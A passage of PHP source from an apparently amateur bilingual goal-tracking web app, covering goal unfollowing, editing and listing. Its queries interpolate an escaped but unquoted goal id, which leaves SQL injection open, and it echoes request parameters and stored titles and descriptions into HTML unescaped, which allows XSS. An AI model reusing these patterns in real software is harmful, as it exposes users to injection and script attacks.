							$check_goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE id=$goalid LIMIT 1");
							if(mysqli_num_rows($check_goal_query))
							{
								$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']." LIMIT 1");
								if(mysqli_num_rows($check_following_query))
								{
									mysqli_query($mysql_connection, "DELETE FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']."");
									echo $output_success;
								}else
								{
									echo $output_not_following;
								}
							}else
							{
								echo $output_no_goal;
							}
							break;
							
							case 'editgoal':
							switch($_GET['language'])
							{
								case 'german':
								$label_anonymous = "Anonym posten?";
								$label_title = "Titel";
								$label_section = "Bereich";
								$label_description = "Beschreibung";
								$option_yes = "Ja";
								$option_no = "Nein";
								$input_submit = "Los gehts!";
								$output_not_author = "Du bist nicht der Autor dieses Zieles.";
								$output_no_goal = "Dieses Ziel existiert nicht.";
								$sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" );
								break;
								
								case 'english':
								$label_anonymous = "Post anonymously?";
								$label_title = "Title";
								$label_section = "Section";
								$label_description = "Description";
								$option_yes = "Yes";
								$option_no = "No";
								$input_submit = "Let's go!";
								$output_not_author = "You are not the author of this goal.";
								$output_no_goal = "There is no such goal.";
								$sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" );
								break;
							}
							$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
							$goal_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE id=$goalid LIMIT 1");
							if(mysqli_num_rows($goal_query))
							{
								$check_author_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=$goalid LIMIT 1");
								$check_author = mysqli_fetch_array($check_author_query);
								if($check_author['userid'] == $userdata['id'])
								{
									$goal = mysqli_fetch_array($goal_query);
									echo "<form action=\"login.php?language=".$_GET['language']."&action=editedgoal&goalid=".$goalid."\" method=\"post\" accept-charset=\"utf-8\">";
										echo "<label>".$label_anonymous."</label>";
										echo "<div class=\"clear\"></div>";
										echo "<select name=\"anonymous\" size=\"1\">";
											if($goal['anonymous'])
											{
												echo "<option value=\"0\">".$option_no."</option>";
												echo "<option value=\"1\" selected>".$option_yes."</option>";
											}else
											{
												echo "<option value=\"0\" selected>".$option_no."</option>";
												echo "<option value=\"1\">".$option_yes."</option>";
											}
										echo "</select>";
										echo "<div class=\"clear\"></div>";
										echo "<label>".$label_title."</label>";
										echo "<input name=\"title\" size=\"50\" value=\"".$goal['title']."\"></input>";
										echo "<label>".$label_section."</label>";
										echo "<div class=\"clear\"></div>";
										echo "<select name=\"section\" size=\"1\">";
											foreach($sections as $section => $output_section)
											{
												if($goal['section'] == $section)
												{
													echo "<option value=\"".$section."\" selected>".$output_section."</option>";
												}else
												{
													echo "<option value=\"".$section."\">".$output_section."</option>";
												}
											}
										echo "</select>";
										echo "<div class=\"clear\"></div>";
										echo "<label>".$label_description."</label>";
										echo "<textarea name=\"description\" cols=\"64\" rows=\"15\"/>".$goal['description']."</textarea>";
										echo "<br>";
										echo "<p><input type=\"submit\" value=\"".$input_submit."\"></input></p>";
									echo "</form>";
								}else
								{
									echo $output_not_author;
								}
							}else
							{
								echo $output_no_goal;
							}
							break;
							
							case 'editedgoal':
							switch($_GET['language'])
							{
								case 'german':
								$output_success = "Ziel geändert.";
								$output_fail = "Bitte alle Felder ausfüllen.";
								$output_not_author = "Du bist nicht der Autor dieses Zieles.";
								$output_no_goal = "Dieses Ziel existiert nicht.";
								break;
								
								case 'english':
								$output_success = "Goal edited.";
								$output_fail = "Please fill in all fields.";
								$output_not_author = "You are not the author of this goal.";
								$output_no_goal = "There is no such goal.";
								break;
							}
							$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
							$check_author_query = mysqli_query($mysql_connection, "SELECT userid FROM goals WHERE id=$goalid LIMIT 1");
							if(mysqli_num_rows($check_author_query))
							{
								$check_author = mysqli_fetch_array($check_author_query);
								if($check_author['userid'] == $userdata['id'])
								{
									if(empty($_POST['title']) OR empty($_POST['description']))
									{
										echo $output_fail;
									}else
									{
										$anonymous = mysqli_real_escape_string($mysql_connection, $_POST['anonymous']);
										$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
										$section = mysqli_real_escape_string($mysql_connection, $_POST['section']);
										$description = mysqli_real_escape_string($mysql_connection, $_POST['description']);
										mysqli_query($mysql_connection, "UPDATE goals SET anonymous = '".$anonymous."', title = '$title', description = '$description', section = '$section' WHERE id=$goalid");
										echo $output_success;
									}
								}else
								{
									echo $output_not_author;
								}
							}else
							{
								echo $output_no_goal;
							}
							break;
							
							case 'goallist':
							switch($_GET['language'])
							{
								case 'german':
								$output_author_anonymous = "Anonym";
								$sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" );
								break;
								
								case 'english':
								$output_author_anonymous = "Anonymous";
								$sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" );
								break;
							}
							echo "<table width=\"100%\" border=\"1\">";
							foreach($sections as $section=>$section_output)
							{	
								$goallist_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE section = '$section'");
								echo "<tr><td colspan=\"2\"><b>".$section_output."</b></td></tr>";
								while($goallist = mysqli_fetch_array($goallist_query))
								{
									if($goallist['anonymous'])
									{
										$author = $output_author_anonymous;
									}else
									{
										$author_data_query = mysqli_query($mysql_connection, "SELECT id,name, surname FROM users WHERE id = ".$goallist['userid']);
										$author_data = mysqli_fetch_array($author_data_query);
										$author = "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$author_data['id']."\">".$author_data['surname']." ".$author_data['name']."</a>";
									}
									echo "<tr><td width=\"20%\">".$author."</td><td><a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goallist['id']."\">".$goallist['title']."</a></td></tr>";
								}
							}
							echo "</table>";
							
							break;
							
						}
					}else
					{
							echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=invalidsession'; </script>";
					}
				echo "</div>";
				echo "<div class=\"boxleft\">";
					echo "<div class=\"leftinnerbox\">";
						switch($_GET['language'])
						{
							case 'german':
							$output_goallist = "Liste aller Ziele";
							break;
							
							case 'english':
							$output_goallist = "List of all goals";
							break;
						}
						echo "<a href=\"login.php?language=".$_GET['language']."&action=goallist\">".$output_goallist."</a>";
					echo "</div>";
				echo "</div>";
			echo "</div>";
		echo "</body>";
	echo "</html>";
?>